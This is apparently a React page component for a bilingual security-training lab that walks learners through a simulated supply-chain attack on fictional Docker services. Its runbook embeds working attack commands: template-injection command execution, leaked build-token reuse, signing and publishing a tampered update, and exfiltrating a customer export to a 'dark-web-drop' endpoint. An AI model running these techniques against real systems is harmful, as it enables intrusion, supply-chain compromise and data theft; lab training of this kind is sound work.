import { useMemo, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import {
  AlertTriangle,
  ArrowLeft,
  CheckCircle2,
  Clock3,
  Download,
  ExternalLink,
  FileSearch,
  Network,
  Power,
  RadioTower,
  RotateCcw,
  Server,
  ShieldCheck,
  Terminal,
} from 'lucide-react';
import { LanguageToggle, languageToggleStyles, useScenarioLanguage } from './scenarioLanguage.jsx';

const C = {
  bg: '#03060a',
  panel: 'rgba(15, 23, 42, 0.72)',
  panelStrong: 'rgba(8, 13, 24, 0.92)',
  panelSoft: 'rgba(8, 13, 24, 0.56)',
  border: 'rgba(148, 163, 184, 0.16)',
  accent: '#22d3ee',
  amber: '#f59e0b',
  green: '#34d399',
  red: '#fb7185',
  text: '#e5eefc',
  muted: '#94a3b8',
};

const LAB_DIR_PLACEHOLDER = '<LAB_DIR>';

const commandSets = [
  {
    id: 'wsl',
    label: 'WSL Docker',
    badge: 'Recommended',
    summary: 'Use this when the lab folder is available from WSL and Docker runs inside Ubuntu.',
    commands: [
      `wsl.exe sh -lc "cd '${LAB_DIR_PLACEHOLDER}' && docker compose up --build -d"`,
      `wsl.exe sh -lc "cd '${LAB_DIR_PLACEHOLDER}' && docker compose ps"`,
    ],
  },
  {
    id: 'local',
    label: 'Local Docker',
    badge: 'Standard',
    summary: 'Use this when Docker Desktop or a local Docker CLI is directly available.',
    commands: [`cd "${LAB_DIR_PLACEHOLDER}"`, 'docker compose up --build -d', 'docker compose ps'],
  },
  {
    id: 'vm',
    label: 'Cloud VM / SSH',
    badge: 'Coming Soon',
    summary: 'Reserved for future per-user VM, SSH, or browser-terminal access.',
    commands: ['ssh root14@<lab-host>', 'ssh -L 8081:localhost:8081 root14@<lab-host>'],
  },
];

const labCopy = {
  en: {
    back: 'Practical 3D',
    headline: 'After Practical 3D, enter the real Docker lab.',
    statsFinal: 'Final: Dark Web Impact',
    target: 'LAB TARGET',
    downloadLab: 'Download Docker Lab Package',
    heroBody:
      'Move the scenario topology into a Docker lab and verify the chain through logs, tokens, build artifacts, customer data access, and the controlled drop simulator.',
    environment: 'ENVIRONMENT',
    environmentTitle: 'Select Lab Runtime',
    labDirHint: 'After cloning or downloading the lab package, replace <LAB_DIR> with this folder path.',
    runbook: 'RUNBOOK',
    runbookTitle: (label) => `${label} Commands`,
    checklistTitle: 'Canonical Orion Echo Lab Checklist',
    checklistBody: 'Each stage turns concepts from Concept Class and Practical 3D into commands, responses, and evidence.',
    objectiveKicker: 'MISSION OBJECTIVE',
    targetFile: 'Target file to recover',
    learnerTasks: 'What the learner must do',
    completionCriteria: 'Completion criteria',
    proofToSubmit: 'Evidence to submit',
    toc: 'Curriculum TOC',
    operations: 'OPERATIONS',
    operationsTitle: 'Runtime Commands',
    finalOutputTitle: 'Dark Web Impact Evidence Criteria',
    finalText:
      'This lab does not end with report writing. The canonical ending is an operator action: recover the correct ANRC export file, drop it into the controlled drop simulator, and let the supervisor bot validate the file before issuing the final record.',
    commandSummaries: {
      wsl: 'Use this when the lab folder is available from WSL and Docker runs inside Ubuntu.',
      local: 'Use this when Docker Desktop or a local Docker CLI is directly available.',
      vm: 'Reserved for future per-user VM, SSH, or browser-terminal access.',
    },
    connectionDetails: {
      'Web Entrypoint': 'Routes through edge-proxy into public-site, docs, and support portal.',
      'Operator Shell': 'Internal service interaction is executed from the support-portal container.',
      'Internal Services': 'Corporate and DevOps services are reachable only inside the container network.',
      'Final Impact': 'Attacker-controlled drop simulator watched by a supervisor bot that validates the recovered ANRC export file.',
    },
  },
  ko: {
    back: 'Practical 3D',
    headline: 'Practical 3D 이후, 실제 Docker lab으로 들어갑니다.',
    statsFinal: 'Final: Dark Web Impact',
    target: 'LAB TARGET',
    downloadLab: 'Docker Lab 패키지 다운로드',
    environment: 'ENVIRONMENT',
    environmentTitle: '실습 환경 선택',
    labDirHint: '실습 패키지를 다운로드하거나 clone한 뒤, <LAB_DIR>을 이 폴더 경로로 바꿔 실행합니다.',
    runbook: 'RUNBOOK',
    runbookTitle: (label) => `${label} 실행 명령`,
    checklistTitle: '정본 Orion Echo 실습 체크리스트',
    checklistBody: '각 stage는 Concept Class와 Practical 3D에서 본 개념을 실제 명령, 응답, evidence로 확인하는 순서입니다.',
    objectiveKicker: 'MISSION OBJECTIVE',
    targetFile: '회수해야 할 목표 파일',
    learnerTasks: '학습자가 해야 할 일',
    completionCriteria: '완료 조건',
    proofToSubmit: '제출해야 할 증거',
    toc: '커리큘럼 목차',
    operations: 'OPERATIONS',
    operationsTitle: '운영 명령',
    finalText:
      '이 lab은 보고서 작성에서 끝나지 않습니다. 정본 결말은 올바른 ANRC export 파일을 직접 회수해 controlled drop simulator에 떨구고, supervisor bot이 파일을 검증해 최종 record를 발급하는 것입니다.',
    commandSummaries: {
      wsl: '실습 폴더를 WSL에서 접근할 수 있고 Docker가 Ubuntu 안에서 실행되는 환경에서 사용합니다.',
      local: 'Docker Desktop 또는 로컬 Docker CLI가 바로 잡히는 환경에서 사용합니다.',
      vm: '향후 사용자별 VM, SSH 접속, browser terminal을 붙일 때 사용할 확장 슬롯입니다.',
    },
    connectionDetails: {
      'Web Entrypoint': 'edge-proxy를 통해 public-site, docs, support portal로 라우팅됩니다.',
      'Operator Shell': '내부 서비스 호출은 support-portal 컨테이너에서 수행합니다.',
      'Internal Services': '컨테이너 네트워크 안에서만 접근하는 Corporate/DevOps 서비스입니다.',
      'Final Impact': '회수한 ANRC export 파일을 검증하는 supervisor bot이 붙은 공격자 controlled drop simulator입니다.',
    },
  },
};

const englishStageObjectives = {
  'lab-stage-00-recon': 'Find the first public clues that connect public site and support portal into the Orion Echo internal structure.',
  'lab-stage-01-initial-access': 'Use support portal operational traces to establish initial access evidence and the starting point for internal movement.',
  'lab-stage-02-foothold': 'Use the collected clue to identify internal service location and the next investigation target.',
  'lab-stage-03-c2-emulator': 'Use a safe educational emulator, not real malicious C2, to understand command response and audit events.',
  'lab-stage-04-discovery': 'List internal services such as wiki, ticket, repo, and CI to build the attack-flow map.',
  'lab-stage-05-evidence-collection': 'Collect CI/CD access token and release clues from internal documents and tickets.',
  'lab-stage-06-build-token': 'Confirm how the build trigger token is accepted by the CI runner and build server.',
  'lab-stage-07-artifact-build': 'Inspect build artifact creation, artifact hash, and build metadata.',
  'lab-stage-08-sign-publish': 'Verify how the artifact moves through signing service and update server into a trusted release channel.',
  'lab-stage-09-customer-update': 'Confirm where the ANRC customer environment trusts and applies the vendor update.',
  'lab-stage-10-export-object': 'Find object key and presigned URL in customer export detail and collect final object access proof.',
  'lab-stage-11-dark-web-exfiltration': 'Drop the recovered customer export file into the attacker-controlled simulator and verify that the supervisor bot accepts it.',
};

const stageRunbookGuidance = {
  'lab-stage-00-recon': {
    action: 'Open the lab entrypoint and identify public product, version, release, and ANRC channel clues.',
    command: 'Open the lab target shown on this page, then browse public-site and public-docs through the edge entrypoint.',
    expected: 'Product/version metadata, release notes, and ANRC channel reference.',
  },
  'lab-stage-01-initial-access': {
    action: 'Use the support preview primitive to read the controlled post-exploit marker.',
    command: `docker compose exec -T support-portal python - <<'PY'\nimport httpx\nprint(httpx.post('http://support-portal:8000/preview', json={'body': "{{ support.exec('cat /var/lib/support-portal/.post_exploit_marker') }}"}).json())\nPY`,
    expected: 'Preview audit event and post exploit marker.',
  },
  'lab-stage-02-foothold': {
    action: 'Confirm the foothold context before assuming internal access.',
    command: `docker compose exec -T support-portal python - <<'PY'\nimport httpx\nfor cmd in ['id','hostname','ls /opt/support-portal','cat /tmp/orion_stage2.txt']:\n    body = "{{ support.exec('" + cmd + "') }}"\n    print(cmd, httpx.post('http://support-portal:8000/preview', json={'body': body}).json())\nPY`,
    expected: 'id output, hostname output, allowed command telemetry, and stage2 marker.',
  },
  'lab-stage-03-c2-emulator': {
    action: 'Compatibility checkpoint: register the safe lab transport emulator if the current Docker lab requires it.',
    command: `docker compose exec -T support-portal python - <<'PY'\nimport httpx\nprint(httpx.post('http://c2-emulator:8000/beacon/register', json={'host':'support-portal'}).json())\nPY`,
    expected: 'Beacon registration response and c2 audit event. Treat this as lab plumbing, not the core attack story.',
  },
  'lab-stage-04-discovery': {
    action: 'Discover internal services reachable from the lab foothold path.',
    command: `docker compose exec -T support-portal python - <<'PY'\nimport httpx\nprint(httpx.get('http://c2-emulator:8000/discover/services').json())\nPY`,
    expected: 'Reachable wiki, ticket-service, source-repo, and build-server entries.',
  },
  'lab-stage-05-evidence-collection': {
    action: 'Collect release runbook, ticket, and repo evidence that explains the build path.',
    command: `docker compose exec -T support-portal python - <<'PY'\nimport httpx\nfor url in ['http://wiki:8000/pages/release/runbook-build-trigger','http://ticket-service:8000/tickets/OES-1287','http://source-repo:8000/files/release-pipeline/release.json']:\n    print(url, httpx.get(url).json())\nPY`,
    expected: 'Build trigger token context, OES release ticket, release branch, and ANRC channel.',
  },
  'lab-stage-06-build-token': {
    action: 'Use the discovered build trigger token to create the accepted build job.',
    command: `docker compose exec -T support-portal python - <<'PY'\nimport httpx, json\npayload={'repo':'orionecho/echo-agent','ref':'refs/heads/release/2.6.4','channel':'anrc','trigger_token':'build-trigger-demo-7f3a91'}\nprint(json.dumps(httpx.post('http://build-server:8000/api/jobs', json=payload).json(), indent=2))\nPY`,
    expected: 'HTTP 202 build response, build job id, and acceptance marker.',
  },
  'lab-stage-07-artifact-build': {
    action: 'Inspect the artifact metadata generated by the build system.',
    command: `docker compose exec -T support-portal python - <<'PY'\nimport httpx, json\nartifact = httpx.get('http://build-server:8000/api/artifacts/art-demo-001').json()\nprint(json.dumps(artifact, indent=2))\nPY`,
    expected: 'Artifact id, artifact hash, size, artifact URL, and LAB_BUILD_MARKER.',
  },
  'lab-stage-08-sign-publish': {
    action: 'Verify that the artifact becomes a signed manifest and is published to the ANRC update channel.',
    command: `docker compose exec -T support-portal python - <<'PY'\nimport httpx, json\nartifact = httpx.get('http://build-server:8000/api/artifacts/art-demo-001').json()\ncanonical = {\n    'product': 'EchoAgent',\n    'channel': 'anrc',\n    'version': '2.6.4',\n    'build_id': 'build-2026-0502-001',\n    'artifact': {\n        'name': artifact['name'],\n        'sha256': artifact['sha256'],\n        'url': 'http://updates.release.local/artifacts/' + artifact['name'],\n        'size_bytes': artifact['size_bytes'],\n    },\n    'metadata': {'customer': 'anrc', 'lab_marker': artifact['marker']},\n}\nsignature = httpx.post('http://signing-service:8000/api/sign', json={'canonical_manifest': canonical}).json()['signature']\nmanifest = dict(canonical)\nmanifest['signature'] = signature\npublished = httpx.post('http://update-server:8000/internal/publish', json={'channel': 'anrc', 'manifest': manifest}).json()\nprint(json.dumps({'manifest': manifest, 'published': published}, indent=2))\nprint(json.dumps(httpx.get('http://update-server:8000/channels/anrc/manifest.json').json(), indent=2))\nPY`,
    expected: 'signed manifest, signing log, ANRC update manifest, and release manifest audit event.',
  },
  'lab-stage-09-customer-update': {
    action: 'Force the customer app to poll the trusted vendor update channel.',
    command: `docker compose exec -T support-portal python - <<'PY'\nimport httpx, json\nprint(json.dumps(httpx.post('http://customer-app:8000/api/poll-now').json(), indent=2))\nprint(json.dumps(httpx.get('http://customer-api:8000/metadata').json(), indent=2))\nPY`,
    expected: 'Customer poll response, update applied event, and customer metadata.',
  },
  'lab-stage-10-export-object': {
    action: 'Find the ANRC Q2 export and retrieve the final object through its presigned URL.',
    command: `docker compose exec -T support-portal python - <<'PY'\nimport httpx, json\ndetail=httpx.get('http://customer-api:8000/exports/exp-2026-Q2-007').json()\nprint(json.dumps(detail, indent=2))\nprint(httpx.get(detail['presigned_url']).text)\nPY`,
    expected: 'export id exp-2026-Q2-007, object key, presigned URL, and object access proof.',
  },
  'lab-stage-11-dark-web-exfiltration': {
    action: 'Act as the operator: recover the ANRC export file and drop the file content into the watched drop simulator.',
    command: `docker compose exec -T support-portal python - <<'PY'\nimport httpx, json\ndetail=httpx.get('http://customer-api:8000/exports/exp-2026-Q2-007').json()\nfinal_object=httpx.get(detail['presigned_url']).text\nbundle=httpx.post('http://dark-web-drop:8000/drop/submit', json={'filename':'project-orion-echo-final.txt','export_id':detail['id'],'object_key':detail['object_key'],'file_content':final_object}).json()\nprint(json.dumps(bundle, indent=2))\nprint(json.dumps(httpx.get('http://dark-web-drop:8000/drop/status/' + bundle['submission_id']).json(), indent=2))\nPY`,
    expected: 'supervisor bot passed status, received file path, validation checks, exposed_dataset, and dark_web_drop_record.',
  },
};

const labCommands = [
  {
    title: 'Stop',
    icon: Power,
    command: `wsl.exe sh -lc "cd '${LAB_DIR_PLACEHOLDER}' && docker compose stop"`,
  },
  {
    title: 'Reset',
    icon: RotateCcw,
    command: `wsl.exe sh -lc "cd '${LAB_DIR_PLACEHOLDER}' && docker compose down && docker compose up --build -d"`,
  },
  {
    title: 'Verify Chain',
    icon: ShieldCheck,
    command: `wsl.exe sh -lc "cd '${LAB_DIR_PLACEHOLDER}' && docker compose exec -T support-portal sh -c 'cat > /tmp/verify_chain.py' < scripts/verify_chain.py && docker compose exec -T support-portal python /tmp/verify_chain.py"`,
  },
];

const connectionCards = [
  {
    title: 'Web Entrypoint',
    value: 'Lab target URL',
    detail: 'Routes through edge-proxy into public-site, docs, and support portal.',
    icon: ExternalLink,
  },
  {
    title: 'Operator Shell',
    value: 'docker compose exec -T support-portal python -',
    detail: 'Internal service interaction is executed from the support-portal container.',
    icon: Terminal,
  },
  {
    title: 'Internal Services',
    value: 'wiki, ticket-service, source-repo, build-server',
    detail: 'Corporate and DevOps services are reachable only inside the container network.',
    icon: Network,
  },
  {
    title: 'Final Impact',
    value: 'dark-web-drop:8000/drop/submit',
    detail: 'Attacker-controlled drop simulator where the operator submits the recovered ANRC export file for supervisor validation.',
    icon: AlertTriangle,
  },
];

const labIconRegistry = {
  AlertTriangle,
  CheckCircle2,
  ExternalLink,
  FileSearch,
  Network,
  Power,
  RadioTower,
  RotateCcw,
  Server,
  ShieldCheck,
  Terminal,
};

function resolveLabIcon(icon) {
  if (typeof icon === 'string') return labIconRegistry[icon] || FileSearch;
  return icon || FileSearch;
}

export default function ScenarioHandsOnLab({ course }) {
  const navigate = useNavigate();
  const { curriculum } = course;
  const { language, setLanguage, isEnglish } = useScenarioLanguage();
  const baseCopy = labCopy[language] || labCopy.en;
  const customCopy = curriculum.labCopy?.[language] || curriculum.labCopy?.en || {};
  const t = {
    ...baseCopy,
    ...customCopy,
    commandSummaries: {
      ...(baseCopy.commandSummaries || {}),
      ...(customCopy.commandSummaries || {}),
    },
    connectionDetails: {
      ...(baseCopy.connectionDetails || {}),
      ...(customCopy.connectionDetails || {}),
    },
  };
  const lab = curriculum.lab;
  const finalObjective = lab.finalObjective?.[language] || lab.finalObjective?.en || lab.finalObjective;
  const [selectedMode, setSelectedMode] = useState('wsl');
  const runtimeModes = lab.commandSets || commandSets;
  const stageObjectives = curriculum.labStageObjectives?.[language] || curriculum.labStageObjectives?.en || englishStageObjectives;
  const runbookGuidance = curriculum.labRunbookGuidance?.[language] || curriculum.labRunbookGuidance?.en || stageRunbookGuidance;
  const cards = lab.connectionCards || connectionCards;
  const operations = lab.commands || labCommands;

  const localizedCommandSets = useMemo(() => {
    return runtimeModes.map((mode) => ({
      ...mode,
      summary: t.commandSummaries[mode.id] || mode.summary,
    }));
  }, [runtimeModes, t]);
  const activeMode = useMemo(
    () => localizedCommandSets.find((mode) => mode.id === selectedMode) || localizedCommandSets[0],
    [localizedCommandSets, selectedMode],
  );
  const stages = lab.stages || [];

  const openLab = () => {
    if (lab.url?.startsWith('/')) {
      navigate(lab.url);
      return;
    }
    window.location.href = lab.url;
  };

  return (
    <div className="lab-root" lang={language}>
      <div className="scan-lines" aria-hidden="true" />
      <header className="lab-hero">
        <button className="ghost-back" type="button" onClick={() => navigate(curriculum.routes.practical)}>
          <ArrowLeft size={15} />
          {t.back}
        </button>
        <div className="language-slot">
          <LanguageToggle language={language} setLanguage={setLanguage} />
        </div>

        <div className="hero-grid">
          <div>
            <div className="kicker">{curriculum.scenario.title.toUpperCase()} // LAB CONTROL CENTER</div>
            <h1>{t.headline}</h1>
            <p>{isEnglish ? (t.heroBody || lab.summary) : lab.summary}</p>
            <div className="hero-stats">
              <span><Clock3 size={14} /> {curriculum.scenario.estimatedMinutes || 180} min</span>
              <span><Server size={14} /> {lab.runtimeLabel || 'Docker / WSL'}</span>
              <span><AlertTriangle size={14} /> {t.statsFinal}</span>
            </div>
          </div>

          <aside className="launch-panel">
            <div className="status-row">
              <span className="status-dot" />
              <strong>{t.target}</strong>
              <small>{lab.url}</small>
            </div>
            <button type="button" onClick={openLab}>
              <ExternalLink size={16} />
              {isEnglish ? 'Open Hands-on Lab' : lab.entryLabel}
            </button>
            {lab.downloadUrl && (
              <a className="download-button" href={lab.downloadUrl} download>
                <Download size={16} />
                {isEnglish ? t.downloadLab : lab.downloadLabel || t.downloadLab}
              </a>
            )}
            <div className="path-box">{lab.dockerPath}</div>
            <p className="path-hint">{t.labDirHint}</p>
          </aside>
        </div>
      </header>

      <main className="lab-main">
        {finalObjective && (
          <section className="objective-panel">
            <div className="objective-lead">
              <SectionKicker>{t.objectiveKicker}</SectionKicker>
              <h2>{finalObjective.title}</h2>
              <p>{finalObjective.summary}</p>
              {finalObjective.targetFile && (
                <div className="target-file-strip">
                  <span>{t.targetFile}</span>
                  <strong>{finalObjective.targetFile.name}</strong>
                  <small>{finalObjective.targetFile.description}</small>
                </div>
              )}
            </div>

            <div className="objective-columns">
              <div>
                <strong>{t.learnerTasks}</strong>
                {(finalObjective.learnerTasks || []).map((item) => (
                  <p key={item}>{item}</p>
                ))}
              </div>
              <div>
                <strong>{t.completionCriteria}</strong>
                {(finalObjective.completionCriteria || []).map((item) => (
                  <p key={item}>{item}</p>
                ))}
              </div>
              <div>
                <strong>{t.proofToSubmit}</strong>
                {(finalObjective.proofToSubmit || []).map((item) => (
                  <p key={item}>{item}</p>
                ))}
              </div>
            </div>
          </section>
        )}

        <section className="control-grid">
          <div className="panel">
            <SectionKicker>{t.environment}</SectionKicker>
            <h2>{t.environmentTitle}</h2>
            <div className="mode-list">
              {localizedCommandSets.map((mode) => (
                <button key={mode.id} type="button" className={selectedMode === mode.id ? 'active' : ''} onClick={() => setSelectedMode(mode.id)}>
                  <span>{mode.badge}</span>
                  <strong>{mode.label}</strong>
                  <small>{mode.summary}</small>
                </button>
              ))}
            </div>
          </div>

          <div className="panel command-panel">
            <SectionKicker>{t.runbook}</SectionKicker>
            <h2>{t.runbookTitle(activeMode.label)}</h2>
            <div className="command-stack">
              {activeMode.commands.map((command) => (
                <pre key={command}>{command}</pre>
              ))}
            </div>
          </div>
        </section>

        <section className="connection-grid">
          {cards.map((card) => {
            const Icon = resolveLabIcon(card.icon);
            return (
              <article className="connection-card" key={card.title}>
                <Icon size={18} />
                <span>{card.title}</span>
                <strong>{card.value === 'Lab target URL' ? lab.url : card.value}</strong>
                <p>{t.connectionDetails[card.title] || card.detail}</p>
              </article>
            );
          })}
        </section>

        <section className="stage-section">
          <div className="section-head">
            <div>
              <SectionKicker>STAGE 0-11</SectionKicker>
              <h2>{t.checklistTitle}</h2>
              <p>{t.checklistBody}</p>
            </div>
            <button type="button" onClick={() => navigate(curriculum.routes.toc)}>
              {t.toc}
            </button>
          </div>

          <div className="stage-list">
            {stages.map((stage, index) => (
              <article className={`stage-row ${stage.impact || stage.label.toLowerCase().includes('dark web') || stage.label.toLowerCase().includes('final') ? 'impact' : ''}`} key={stage.id}>
                <div className="stage-number">{String(index).padStart(2, '0')}</div>
                <div>
                  <h3>{stage.label}</h3>
                  <p>{isEnglish ? stageObjectives[stage.id] || stage.objective : stage.objective}</p>
                  <div className="chip-group">
                    {(stage.systems || []).map((system) => (
                      <span key={system}>{system}</span>
                    ))}
                  </div>
                  {runbookGuidance[stage.id] && (
                    <div className="stage-runbook">
                      <strong>{isEnglish ? 'Learner action' : '학습자 실행'}</strong>
                      <p>{isEnglish ? runbookGuidance[stage.id].action : stage.objective}</p>
                      <pre>{runbookGuidance[stage.id].command}</pre>
                      <small>{isEnglish ? 'Expected evidence: ' : '확인할 증거: '}{runbookGuidance[stage.id].expected}</small>
                    </div>
                  )}
                </div>
                <div className="evidence-list">
                  <FileSearch size={15} />
                  <div>
                    {(stage.evidence || []).map((item) => (
                      <small key={item}>{item}</small>
                    ))}
                  </div>
                </div>
              </article>
            ))}
          </div>
        </section>

        <section className="bottom-grid">
          <div className="panel">
            <SectionKicker>{t.operations}</SectionKicker>
            <h2>{t.operationsTitle}</h2>
            <div className="ops-list">
              {operations.map((item) => {
                const Icon = resolveLabIcon(item.icon);
                return (
                  <article key={item.title}>
                    <Icon size={16} />
                    <strong>{item.title}</strong>
                    <pre>{item.command}</pre>
                  </article>
                );
              })}
            </div>
          </div>

          <div className="panel impact-panel">
            <SectionKicker>FINAL OUTPUT</SectionKicker>
            <h2>{isEnglish ? t.finalOutputTitle || lab.report.title : lab.report.title}</h2>
            <p>{t.finalText}</p>
            <div className="report-list">
              {(isEnglish
                ? lab.report.englishChecklist || [
                  'Confirm customer export id and object key',
                  'Confirm presigned URL or object access proof',
                  'Drop the recovered ANRC export file into dark-web-drop /drop/submit',
                  'Verify supervisor pass, received file, exposed_dataset, and dark_web_drop_record',
                ]
                : lab.report.checklist
              ).map((item) => (
                <div key={item}>
                  <CheckCircle2 size={16} />
                  <span>{item}</span>
                </div>
              ))}
            </div>
          </div>
        </section>
      </main>

      <style>{styles}</style>
    </div>
  );
}

function SectionKicker({ children }) {
  return <div className="section-kicker">{children}</div>;
}

const styles = `
  ${languageToggleStyles}
  .lab-root {
    min-height: 100vh;
    background:
      radial-gradient(circle at 72% 0%, rgba(245, 158, 11, 0.13), transparent 32%),
      linear-gradient(180deg, rgba(34, 211, 238, 0.08), rgba(3, 6, 10, 0) 420px),
      ${C.bg};
    color: ${C.text};
    font-family: -apple-system, "Apple SD Gothic Neo", system-ui, sans-serif;
    position: relative;
  }
  .lab-root * { box-sizing: border-box; }
  .scan-lines {
    position: fixed; inset: 0; pointer-events: none; z-index: 1;
    background: repeating-linear-gradient(0deg, rgba(0,0,0,0.16) 0px, rgba(0,0,0,0.16) 1px, transparent 1px, transparent 3px);
    opacity: 0.28;
  }
  .lab-hero, .lab-main { position: relative; z-index: 2; }
  .lab-hero {
    border-bottom: 1px solid ${C.border};
    padding: 34px clamp(24px, 5vw, 70px) 50px;
  }
  .ghost-back {
    display: inline-flex; align-items: center; gap: 8px; height: 34px; padding: 0 12px;
    background: rgba(8, 13, 24, 0.72); border: 1px solid ${C.border}; color: ${C.muted};
    font-size: 12px; letter-spacing: 1px; cursor: pointer; margin-bottom: 30px;
  }
  .language-slot {
    position: absolute;
    right: clamp(24px, 5vw, 70px);
    top: 34px;
  }
  .kicker, .section-kicker {
    color: ${C.amber};
    font-family: "JetBrains Mono", Consolas, monospace;
    font-size: 11px;
    font-weight: 900;
    letter-spacing: 0.16em;
  }
  .hero-grid {
    display: grid;
    grid-template-columns: minmax(0, 1fr) 410px;
    gap: 48px;
    align-items: end;
    max-width: 1240px;
    margin: 0 auto;
  }
  .lab-hero h1 {
    margin: 18px 0 16px;
    font-size: clamp(42px, 5vw, 72px);
    line-height: 1.03;
    font-weight: 780;
    letter-spacing: 0;
    max-width: 960px;
  }
  .lab-hero p {
    max-width: 880px;
    color: #cbd5e1;
    font-size: 18px;
    line-height: 1.78;
    margin: 0;
  }
  .hero-stats {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
    margin-top: 24px;
  }
  .hero-stats span {
    align-items: center;
    border: 1px solid rgba(34,211,238,0.22);
    color: #dff6ff;
    display: inline-flex;
    gap: 8px;
    font-family: "JetBrains Mono", Consolas, monospace;
    font-size: 12px;
    font-weight: 800;
    padding: 8px 10px;
  }
  .launch-panel, .panel, .connection-card, .stage-section {
    background: ${C.panel};
    border: 1px solid ${C.border};
  }
  .launch-panel {
    display: grid;
    gap: 14px;
    padding: 20px;
  }
  .status-row {
    display: grid;
    gap: 8px;
  }
  .status-row strong {
    color: ${C.green};
    font-family: "JetBrains Mono", Consolas, monospace;
    font-size: 12px;
    letter-spacing: 0.14em;
  }
  .status-row small, .path-box {
    color: #cbd5e1;
    line-height: 1.55;
    word-break: break-all;
  }
  .status-dot {
    background: ${C.green};
    box-shadow: 0 0 18px rgba(52,211,153,0.8);
    display: block;
    height: 9px;
    width: 9px;
  }
  .launch-panel button, .download-button, .section-head button {
    align-items: center;
    background: ${C.amber};
    border: 1px solid ${C.amber};
    color: #120a02;
    cursor: pointer;
    display: inline-flex;
    font-family: "JetBrains Mono", Consolas, monospace;
    font-weight: 900;
    gap: 8px;
    justify-content: center;
    letter-spacing: 0.14em;
    min-height: 46px;
    text-decoration: none;
  }
  .download-button {
    background: rgba(34, 211, 238, 0.12);
    border-color: rgba(34, 211, 238, 0.38);
    color: #dff6ff;
  }
  .path-box {
    background: rgba(3,6,10,0.44);
    border: 1px solid rgba(148,163,184,0.12);
    font-size: 12px;
    padding: 12px;
  }
  .path-hint {
    color: ${C.muted};
    font-size: 12px;
    line-height: 1.55;
    margin: -4px 0 0;
  }
  .lab-main {
    max-width: 1240px;
    margin: 0 auto;
    padding: 42px clamp(22px, 4vw, 40px) 88px;
  }
  .objective-panel {
    background:
      linear-gradient(135deg, rgba(245,158,11,0.13), rgba(34,211,238,0.055)),
      ${C.panelStrong};
    border: 1px solid rgba(245,158,11,0.34);
    box-shadow: 0 0 34px rgba(245,158,11,0.06);
    display: grid;
    gap: 22px;
    margin-bottom: 18px;
    padding: 24px;
  }
  .objective-lead h2 {
    color: ${C.text};
    font-size: 38px;
    line-height: 1.12;
    margin: 10px 0 12px;
  }
  .objective-lead p {
    color: #dbeafe;
    font-size: 17px;
    line-height: 1.72;
    margin: 0;
    max-width: 980px;
  }
  .target-file-strip {
    align-items: center;
    background: rgba(3,6,10,0.48);
    border: 1px solid rgba(34,211,238,0.3);
    display: grid;
    gap: 7px;
    grid-template-columns: 220px minmax(260px, 0.55fr) 1fr;
    margin-top: 18px;
    padding: 14px 16px;
  }
  .target-file-strip span {
    color: ${C.amber};
    font-family: "JetBrains Mono", Consolas, monospace;
    font-size: 12px;
    font-weight: 900;
    letter-spacing: 0.12em;
    text-transform: uppercase;
  }
  .target-file-strip strong {
    color: #dff6ff;
    font-family: "JetBrains Mono", Consolas, monospace;
    font-size: 14px;
    word-break: break-word;
  }
  .target-file-strip small {
    color: ${C.muted};
    line-height: 1.55;
  }
  .objective-columns {
    display: grid;
    gap: 12px;
    grid-template-columns: repeat(3, minmax(0, 1fr));
  }
  .objective-columns > div {
    background: rgba(3,6,10,0.38);
    border: 1px solid rgba(148,163,184,0.14);
    padding: 16px;
  }
  .objective-columns strong {
    color: ${C.amber};
    display: block;
    font-family: "JetBrains Mono", Consolas, monospace;
    font-size: 12px;
    letter-spacing: 0.12em;
    margin-bottom: 11px;
    text-transform: uppercase;
  }
  .objective-columns p {
    border-left: 2px solid rgba(34,211,238,0.34);
    color: #cbd5e1;
    font-size: 14px;
    line-height: 1.58;
    margin: 9px 0 0;
    padding-left: 10px;
  }
  .control-grid, .bottom-grid {
    display: grid;
    gap: 16px;
    grid-template-columns: 0.95fr 1.05fr;
    margin-bottom: 18px;
  }
  .panel {
    padding: 22px;
  }
  .panel h2, .stage-section h2 {
    color: ${C.text};
    font-size: 32px;
    line-height: 1.15;
    margin: 10px 0 16px;
  }
  .mode-list {
    display: grid;
    gap: 10px;
  }
  .mode-list button {
    background: rgba(3,6,10,0.36);
    border: 1px solid rgba(148,163,184,0.13);
    color: ${C.text};
    cursor: pointer;
    display: grid;
    gap: 7px;
    padding: 16px;
    text-align: left;
  }
  .mode-list button.active {
    border-color: rgba(34,211,238,0.55);
    box-shadow: 0 0 24px rgba(34,211,238,0.08);
  }
  .mode-list span {
    color: ${C.amber};
    font-family: "JetBrains Mono", Consolas, monospace;
    font-size: 11px;
    font-weight: 900;
    letter-spacing: 0.12em;
  }
  .mode-list strong {
    font-size: 18px;
  }
  .mode-list small, .connection-card p, .stage-row p, .impact-panel p {
    color: ${C.muted};
    line-height: 1.62;
  }
  pre {
    background: rgba(3,6,10,0.58);
    border: 1px solid rgba(245,158,11,0.22);
    color: #fed7aa;
    font-family: "JetBrains Mono", Consolas, monospace;
    font-size: 12px;
    line-height: 1.7;
    margin: 0;
    overflow-x: auto;
    padding: 14px;
    white-space: pre-wrap;
    word-break: break-word;
  }
  .command-stack, .ops-list {
    display: grid;
    gap: 10px;
  }
  .connection-grid {
    display: grid;
    gap: 12px;
    grid-template-columns: repeat(4, minmax(0, 1fr));
    margin-bottom: 18px;
  }
  .connection-card {
    min-height: 210px;
    padding: 18px;
  }
  .connection-card svg {
    color: ${C.accent};
    margin-bottom: 16px;
  }
  .connection-card span {
    color: ${C.amber};
    display: block;
    font-family: "JetBrains Mono", Consolas, monospace;
    font-size: 11px;
    font-weight: 900;
    letter-spacing: 0.12em;
    margin-bottom: 10px;
  }
  .connection-card strong {
    color: ${C.text};
    display: block;
    font-size: 16px;
    line-height: 1.35;
    margin-bottom: 10px;
    word-break: break-word;
  }
  .stage-section {
    padding: 24px;
    margin-bottom: 18px;
  }
  .section-head {
    align-items: end;
    display: flex;
    gap: 18px;
    justify-content: space-between;
    margin-bottom: 20px;
  }
  .section-head p {
    color: ${C.muted};
    line-height: 1.7;
    margin: -4px 0 0;
    max-width: 760px;
  }
  .section-head button {
    background: rgba(245,158,11,0.1);
    color: #fed7aa;
    padding: 0 18px;
  }
  .stage-list {
    display: grid;
    gap: 10px;
  }
  .stage-row {
    background: ${C.panelSoft};
    border: 1px solid rgba(148,163,184,0.12);
    display: grid;
    gap: 18px;
    grid-template-columns: 58px minmax(0, 1fr) 330px;
    padding: 18px;
  }
  .stage-row.impact {
